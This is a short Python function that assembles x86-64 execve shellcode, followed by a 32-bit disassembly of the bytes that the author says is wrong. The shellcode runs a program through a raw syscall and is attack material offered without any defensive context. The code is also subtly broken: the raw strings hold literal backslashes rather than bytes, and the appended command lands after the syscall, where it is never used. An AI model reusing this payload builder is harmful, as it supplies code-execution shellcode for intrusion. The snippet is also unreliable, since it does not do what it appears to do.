def execc( command):
	shellcode =  r"\x48\x31\xd2\xe8\x06\x00\x00\x00\x68\x65\x6c"
	shellcode += r"\x6c\x6f\x00\x5f\x52\x57\x48\x89\xe6\x48\x31\xc0\x48\x83\xc8\x3b\x0f\x05"
	shellcode += command
	return shellcode


#Shellcode disassembly with 32bit so must be edit little bit.Instructions are wrong.
"""
00000000  48                dec eax
00000001  31D2              xor edx,edx
00000003  E806000000        call dword 0xe
00000008  68656C6C6F        push dword 0x6f6c6c65
0000000D  005F52            add [edi+0x52],bl
00000010  57                push edi
00000011  48                dec eax
00000012  89E6              mov esi,esp
00000014  48                dec eax
00000015  31C0              xor eax,eax
00000017  48                dec eax
00000018  83C83B            or eax,byte +0x3b
0000001B  0F05              syscall
"""